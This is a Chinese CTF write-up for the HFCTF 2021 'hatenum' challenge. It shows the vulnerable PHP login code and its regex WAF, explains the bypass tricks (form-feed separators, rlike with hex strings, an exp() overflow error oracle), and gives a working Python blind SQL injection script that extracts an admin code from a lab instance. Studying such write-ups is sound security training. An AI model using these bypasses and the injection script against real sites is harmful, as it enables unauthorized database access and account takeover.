---
title: '[HFCTF 2021 Final]hatenum'
date: 2025-02-21 20:15:08
tags: sql注入
categories: 刷题笔记
---

## [HFCTF 2021 Final]hatenum

我们下载文件，查看关键源码

```php
<?php
error_reporting(0);
session_start();
class User{
	public $host = "localhost";
	public $user = "root";
	public $pass = "123456";
	public $database = "ctf";
	public $conn;
	function __construct(){
		$this->conn = new mysqli($this->host,$this->user,$this->pass,$this->database);
		if(mysqli_connect_errno()){
			die('connect error');
		}
	}
	function find($username){
		$res = $this->conn->query("select * from users where username='$username'");
		if($res->num_rows>0){
			return True;
		}
		else{
			return False;
		}

	}
	function register($username,$password,$code){
		if($this->conn->query("insert into users (username,password,code) values ('$username','$password','$code')")){
			return True;
		}
		else{
			return False;
		}
	}
	function login($username,$password,$code){
		$res = $this->conn->query("select * from users where username='$username' and password='$password'");
		if($this->conn->error){
			return 'error';
		}
		else{
			$content = $res->fetch_array();
			if($content['code']===$_POST['code']){
				$_SESSION['username'] = $content['username'];
				return 'success';
			}
			else{
				return 'fail';
			}
		}

	}
}

function sql_waf($str){
	if(preg_match('/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|>|<| |\*|,|;|\r|\n|\t|substr|right|left|mid/i', $str)){
		die('Hack detected');
	}
}

function num_waf($str){
	if(preg_match('/\d{9}|0x[0-9a-f]{9}/i',$str)){
		die('Huge num detected');
	}
}

function array_waf($arr){
	foreach ($arr as $key => $value) {
		if(is_array($value)){
			array_waf($value);
		}
		else{
			sql_waf($value);
			num_waf($value);
		}
	}
}
```

我们发现它过滤了一大堆东西

```
'/\d{9}|0x[0-9a-f]{9}/i'
```

```
'/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|>|<| |\*|,|;|\r|\n|\t|substr|right|left|mid/i'
```

基本上常用的都给过滤掉了

我们尝试登录，登录的话，登录成功、登录失败和发生错误是三个不同的回显，那我们就可以通过触发错误进行盲注，这里不能使用整数溢出操作，因为这里限制了字符的位数，所以整数溢出做不到

这里有两个做法

第一种是选择exp函数，上限是exp(709),再加数次就会出现浮点数溢出报错

还有一种是对0去反，也就是~0,这种操作可以直接得到最大整数

具体看这篇[博客](https://blog.z3ratu1.top/[HFCTF2021]hatenum.html)



我们来讲第一种，首先要了解

### **exp函数用法**

1、MySQL中的exp()函数用于将E提升为指定数字X的幂，这里E(2.718281 …)是自然对数的底数，exp()函数在sql注入里面exp函数一般被用做报错注入（mysql<5.5.53）里面输出报错信息

2、这里注入利用的是Double溢出，exp(x) 含义为e的x次方，当x>709时就超过了double的取值范围造成报错输出

3、我们可以用 ~ 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 Double 数组范围，从而报错输出



### 关键字绕过

我们来进行绕过关键字

盲注通常会用到以下几个关键字:

字符串截取类（substr）、条件判断类（if）、语句分割类（空格、/**/）、逻辑运算类（and、or） 



**字符串截取类**

禁用：`substr、left、right、mid`

绕过： `like、rlike、instr`

其中like与rlike的区别是 rlike支持正则表达式，而like只支持如%，_等有限的通配符，like可以近似于"="



**语句分割**

禁用： 空格、r(%0d)、n(%0a)、t(%09)、/**/

语句之间分割常常使用空格

绕过： %a0（&nbsp）、%0b(垂直制表符)、%0c（换页符）



**逻辑运算**

禁用： and、or、=、>、<、regexp

绕过： &&、||、 like、greatest、least



**条件判断**

禁用： 因为禁用了,，所以if 语句没法使用

exp()函数除了能用在报错注入以外，利用exp在参数大于709时会报错的特性可以用来构造条件判断语句

```
||exp(710-(... rlike ...))
```

即如果 `(... rlike ...)` 中的语句执行匹配后的结果为`True`，经过减号转换后为 `exp(710-1)` 后不会溢出；若为`false`，转换为 `exp(710-0)` 后则会溢出并报错

### 解题

有了前面的绕过后，我们就能开始解题了，我们可以判断code的长度，进而猜解code字段的具体值

由于`'`被过滤，所以rlike后面不能出现字符串，需要 将正则表达式 `^xxx` 转换成十六进制

同时`num_waf` 有个判断十六进制位数不能超过9位，既字符串不能超过4位`(一个字母对应2个十六进制数)`，所以在包含正则`^`以外的字符串超过`3`位时需要不断做替换，用3位字符串去匹配下一位

```
import requests as r
import string

url = "http://29d68ff8-0fbd-47e4-9de4-3702f4bb7a55.node4.buuoj.cn:81"
pt = string.ascii_letters+string.digits+"$"
# string.ascii_letters 所有字母  string.digits 所有数字


def str2hex(raw):
    ret = '0x'
    for i in raw:
    
        # ord 返回对应的ASCII数值，hex 返回16进制数，以字符串形式表示，rjust返回一个长度为2的字符串，不够用0替补
        # 转换16进制,16进制在数据库执行查询时又默认转换成字符串
        ret += hex(ord(i))[2:].rjust(2,'0')
    return ret

ans = ""
tmp = "^"

for i in range(24):
    for ch in pt:

        payload = f"||1 && username rlike 0x61646d && exp(710-(code rlike binary {str2hex(tmp+ch)}))#"

        payload = payload.replace(' ',  chr(0x0c)) # 0c 换页键

        data = {
            "username":"eki\\",
            "password":payload,
            "code":"1"
        }

        req = r.post(url+"/login.php",data=data,allow_redirects=False) 
        # 其实allow_redirects默认是True,所以是默认跳转

        if 'fail' in req.text:
            ans += ch
            print(tmp+ch,ans)
            if len(tmp) == 3:
                tmp = tmp[1:]+ch
            else:
                tmp += ch

            break

'''
^e e
^er er
^erg erg
ergh ergh
rghr erghr     
ghru erghru
hrui erghrui
ruig erghruig
uigh erghruigh
igh2 erghruigh2       
gh2u erghruigh2u
h2uy erghruigh2uy
2uyg erghruigh2uyg
uygh erghruigh2uygh
ygh2 erghruigh2uygh2
gh2u erghruigh2uygh2u
h2uy erghruigh2uygh2uy
2uyg erghruigh2uygh2uyg
uygh erghruigh2uygh2uygh     
'''

rev_ans = ""
tmp = "$"

for i in range(24):
    for ch in pt:

        payload = f"||1 && username rlike 0x61646d && exp(710-(code rlike binary {str2hex(ch+tmp)}))#"
        #print(payload)

        payload = payload.replace(' ',chr(0x0c))

        data = {
            "username":"eki\\",
            "password":payload,
            "code":"1"
        }

        req = r.post(url+"/login.php",data=data,allow_redirects=False)

        if 'fail' in req.text:
            rev_ans = ch+rev_ans
            print(ch+tmp,rev_ans)
            if len(tmp) == 3:
                tmp = ch+tmp[:-1]
            else:
                tmp = ch+tmp

            break

'''
g$ g
ig$ ig
2ig$ 2ig
32ig 32ig
u32i u32ig
iu32 iu32ig
uiu3 uiu32ig
3uiu 3uiu32ig
23ui 23uiu32ig
h23u h23uiu32ig
gh23 gh23uiu32ig
igh2 igh23uiu32ig
uigh uigh23uiu32ig
ruig ruigh23uiu32ig
hrui hruigh23uiu32ig
ghru ghruigh23uiu32ig
rghr rghruigh23uiu32ig
ergh erghruigh23uiu32ig
'''

data = {
    "username":"admin\\",
    "password":"||1#",
    "code":"erghruigh2uygh23uiu32ig"
}

req = r.post(url+"/login.php",data=data)

print(req.text)

```

参考

https://blog.csdn.net/m0_55793759/article/details/127078074
